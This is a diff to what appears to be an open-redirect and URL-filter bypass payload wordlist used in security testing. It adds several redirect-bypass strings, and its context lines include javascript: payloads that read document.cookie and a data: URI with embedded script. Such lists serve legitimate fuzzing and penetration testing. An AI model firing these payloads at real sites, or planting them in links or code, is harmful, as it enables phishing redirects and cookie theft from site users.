@@ -261,11 +261,13 @@ http://www.whitelisteddomain.tld:80%40localdomain.pw/
 http://www.whitelisteddomain.tld%2elocaldomain.pw/
 /x:1/:///%01javascript:alert(document.cookie)/
 /https:/%5clocaldomain.pw/
+https:/%5clocaldomain.pw/
 javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
 /http://localdomain.pw
 /%2f%2flocaldomain.pw
 /localdomain.pw/%2f%2e%2e
 /http:/localdomain.pw
+http:/localdomain.pw
 /.localdomain.pw
 http://.localdomain.pw
 .localdomain.pw
@@ -282,3 +284,5 @@ data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.wr
 jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
 http://www.localdomain.pw\.www.whitelisteddomain.tld
 %19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529
+%01https://localdomain.pw
+www.whitelisteddomain.tld;@localdomain.pw
